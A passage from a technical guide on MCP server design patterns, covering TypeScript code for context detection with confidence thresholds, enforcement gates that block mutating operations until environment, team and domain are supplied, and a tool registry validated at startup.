      pattern: /(?:for|in|to)\s+(production|staging|development|test)/gi,
      confidence: 0.9,
      extractor: (match) => match[1].toLowerCase(),
      category: "environment",
    },
    {
      name: "path-environment",
      pattern: /\/(prod|staging|dev|test)(?:\/|$)/i,
      confidence: 0.8,
      extractor: (match) => match[1].toLowerCase(),
      category: "environment",
    },
    // Additional patterns for domain, team, etc.
  ];

  detect(message: string, filePaths?: string[]): Map<string, ContextSignal> {
    const signals = new Map<string, ContextSignal>();

    for (const pattern of this.patterns) {
      const matches = [...message.matchAll(pattern.pattern)];
      for (const match of matches) {
        const value = pattern.extractor(match);
        if (pattern.validator && !pattern.validator(value)) continue;

        const existing = signals.get(pattern.category);
        if (!existing || pattern.confidence > existing.confidence) {
          signals.set(pattern.category, {
            value, confidence: pattern.confidence,
            source: "user-message", category: pattern.category,
          });
        }
      }
    }

    return signals;
  }
}
```

**Confidence thresholds:**

| Threshold | Range | Action |
|-----------|-------|--------|
| HIGH | >= 0.8 | Proceed automatically with detected value |
| MEDIUM | 0.5 - 0.79 | Elicit confirmation ("We detected X -- is this correct?") |
| LOW | < 0.5 | Full elicitation required ("What environment is this for?") |

**Progressive disclosure:**

Only ask for information not already detected with sufficient confidence. If the server detects the environment from the file path with 0.85 confidence, it skips the environment question and only asks about team and domain.

**MCP native `context.elicit()` integration:**

When the MCP SDK provides `context.elicit()`, use it for native integration with the AI client. Fall back to structured tool responses when the SDK method is not available:

```typescript
async function elicitContext(
  context: ToolContext,
  request: ElicitationRequest,
): Promise<ElicitationResponse> {
  // Try MCP native elicitation
  if (context.elicit) {
    const result = await context.elicit(request.message, request.schema);
    return {
      requestId: request.id,
      data: result.data,
      declined: result.action === "decline",
      cancelled: result.action === "cancel",
    };
  }

  // Fallback: return structured prompt as tool response
  return {
    requestId: request.id,
    declined: false,
    cancelled: false,
    error: "Elicitation not supported -- provide context directly",
  };
}
```

---

## 29. Operation Enforcement Gates

### Pattern

Read-Only Mode (Section 8) blocks entire categories of operations. Enforcement gates are more surgical: they block specific mutating operations until mandatory prerequisites are explicitly provided, then cache the validated context for the session.

The distinction matters. Read-only mode is a deployment-wide setting ("this server cannot write"). Enforcement gates are per-operation context requirements ("this operation needs environment and team before it can proceed"). A server can have enforcement gates active even when read-only mode is off.

Enforcement gates slot into the handler pipeline (Section 5) after security validation and before observability. They compose with the universal wrapping architecture -- every mutating tool automatically gets enforcement without per-tool code.

### Reference Implementation

**Mandatory context type:**

```typescript
// src/enforcement/gate.ts
interface MandatoryContext {
  domain: string;
  environment: string;
  team: string;
  sessionId?: string;
  elicitationComplete: boolean;
  contextConfidence: number;
}
```

**Typed blocking error:**

When an enforcement gate blocks an operation, it throws a structured error that carries the missing field list and the elicitation session metadata. The AI client uses this to know exactly what to ask the user:

```typescript
// src/enforcement/gate.ts
class OperationBlockedError extends Error {
  constructor(
    public readonly operation: string,
    public readonly missingFields: string[],
    public readonly elicitationSession: ElicitationSession,
  ) {
    super(`OPERATION BLOCKED: ${operation} requires: ${missingFields.join(", ")}`);
    this.name = "OperationBlockedError";
  }
}
```

**`withMandatoryContext()` higher-order function:**

```typescript
// src/enforcement/gate.ts
async function withMandatoryContext<T>(
  operationName: string,
  operationContext: OperationContext,
  operation: (validated: MandatoryContext) => Promise<T>,
): Promise<T> {
  const gate = EnforcementGate.getInstance();
  const validated = await gate.validate(operationContext);
  return operation(validated);
}
```

**Enforcement gate (singleton):**

```typescript
// src/enforcement/gate.ts
class EnforcementGate {
  private static instance: EnforcementGate;
  private activeSessions = new Map<string, MandatoryContext>();

  static getInstance(): EnforcementGate {
    if (!EnforcementGate.instance) {
      EnforcementGate.instance = new EnforcementGate();
    }
    return EnforcementGate.instance;
  }

  async validate(context: OperationContext): Promise<MandatoryContext> {
    // Check cache first
    const cached = this.activeSessions.get(context.sessionId);
    if (cached?.elicitationComplete) return cached;

    // Analyze available context using detection (Section 28)
    const detected = contextDetector.detect(context.userMessage, context.filePaths);

    // Identify missing mandatory fields
    const missingFields: string[] = [];
    if (!detected.has("domain")) missingFields.push("domain");
    if (!detected.has("environment")) missingFields.push("environment");
    if (!detected.has("team")) missingFields.push("team");

    // BLOCK if any mandatory field is missing -- no defaults
    if (missingFields.length > 0) {
      const session = elicitationManager.createSession({ operation: context.operationName });
      throw new OperationBlockedError(context.operationName, missingFields, session);
    }

    // Build validated context
    const validated: MandatoryContext = {
      domain: detected.get("domain")!.value,
      environment: detected.get("environment")!.value,
      team: detected.get("team")!.value,
      sessionId: context.sessionId,
      elicitationComplete: true,
      contextConfidence: Math.min(
        detected.get("domain")!.confidence,
        detected.get("environment")!.confidence,
        detected.get("team")!.confidence,
      ),
    };

    // Cache for session reuse
    this.activeSessions.set(context.sessionId, validated);
    return validated;
  }

  clearSession(sessionId: string): void {
    this.activeSessions.delete(sessionId);
  }
}
```

**Zero-fallback policy:**

The enforcement gate intentionally provides no bypass mechanism. There is no `skipValidation` parameter, no `defaultContext` fallback, no override flag. If mandatory fields are missing, the operation blocks. This is an architectural decision, not a configuration option.

**When to use enforcement gates vs read-only mode (Section 8):**

| Scenario | Mechanism | Example |
|----------|-----------|---------|
| Prevent all writes in production | Read-Only Mode (S8) | `READ_ONLY_MODE=true` |
| Require context before writes | Enforcement Gates (S29) | "What environment is this for?" |
| Block specific dangerous operations | Security Validation (S7) | Injection detection |
| Validate parameter format | Schema Validation (S2) | Zod parse errors |

**Composition with universal wrapping (Section 5):**

Enforcement gates integrate into the handler pipeline:

```
Security Validation -> Enforcement Gate -> Observability -> Handler
       (S7)                (S29)              (S11)        (S3)
```

Read operations bypass the enforcement gate -- they do not modify state and do not need contextual validation.

---

## 30. Tool Registry with Validation

### Pattern

Section 4 covers how tools are registered. This section covers what happens after: validation, querying, and runtime inventory. At 20+ tools, a central registry becomes essential for preventing duplicate method names, ensuring structural completeness, and providing introspection APIs for debugging and monitoring.

The registry aggregates tools from category modules, validates uniqueness and completeness at startup, and exposes query methods. If validation fails, the server refuses to start -- better to fail fast than to discover at runtime that two tools share a method name and one silently shadows the other.

### Reference Implementation

**Tool interface:**

```typescript
// src/tools/registry.ts
import { z } from "zod";

interface MCPTool {
  method: string;      // JSON-RPC method name (unique identifier)
  name: string;        // Human-readable display name
  description: string; // AI-facing description
  parameters: z.ZodObject<z.ZodRawShape>;
  category: string;    // Organizational grouping
}
```

**Registry with validation:**

```typescript
// src/tools/registry.ts
import { analyticsTools } from "./analytics/tools.js";
import { configurationTools } from "./configuration/tools.js";
import { portalTools } from "./portal/tools.js";
// ... additional category imports

function getAllTools(): MCPTool[] {
  return [
    ...analyticsTools(),
    ...configurationTools(),
    ...portalTools(),
    // ... additional categories
  ];
}

function validateToolRegistry(): { isValid: boolean; errors: string[] } {
  const methods = new Set<string>();
  const errors: string[] = [];
  const tools = getAllTools();

  for (const tool of tools) {
    // Check for duplicate method names
    if (methods.has(tool.method)) {
      errors.push(`Duplicate method name: ${tool.method}`);
    }
    methods.add(tool.method);

    // Check structural completeness
    if (!tool.method || !tool.name || !tool.description || !tool.parameters || !tool.category) {
      errors.push(`Incomplete tool definition: ${tool.method || "(unnamed)"}`);
    }
  }

  return { isValid: errors.length === 0, errors };
}
```

**Startup validation:**

```typescript
// src/index.ts
const validation = validateToolRegistry();
if (!validation.isValid) {
  for (const error of validation.errors) {
    console.error(`[FATAL] Tool registry error: ${error}`);
  }
  process.exit(1);
}
```

**Introspection APIs:**

```typescript
// src/tools/registry.ts
function getToolsByCategory(category: string): MCPTool[] {
  return getAllTools().filter((t) => t.category === category);
}

function getToolByMethod(method: string): MCPTool | undefined {
  return getAllTools().find((t) => t.method === method);
}

function getAllCategories(): string[] {
  return [...new Set(getAllTools().map((t) => t.category))].sort();
}

function getToolStats(): Record<string, number> {
  const stats: Record<string, number> = {};
  for (const tool of getAllTools()) {
    stats[tool.category] = (stats[tool.category] || 0) + 1;
  }
  return stats;
}
```

**Relationship to Section 4:**

Section 4 covers how individual tools register themselves with the server. The registry (this section) sits above that layer: it aggregates all registered tools, validates the aggregate, and provides runtime queries. Together they form a two-layer system:

| Layer | Section | Responsibility |
|-------|---------|---------------|
| Registration | S4 | Individual tool registers with server via `server.tool()` |
| Registry | S30 | Aggregates all tools, validates uniqueness, provides introspection |

The registry runs before tools are registered with the MCP server. If it detects duplicates or incomplete definitions, the server never starts -- preventing runtime shadows where one tool's handler overwrites another's.
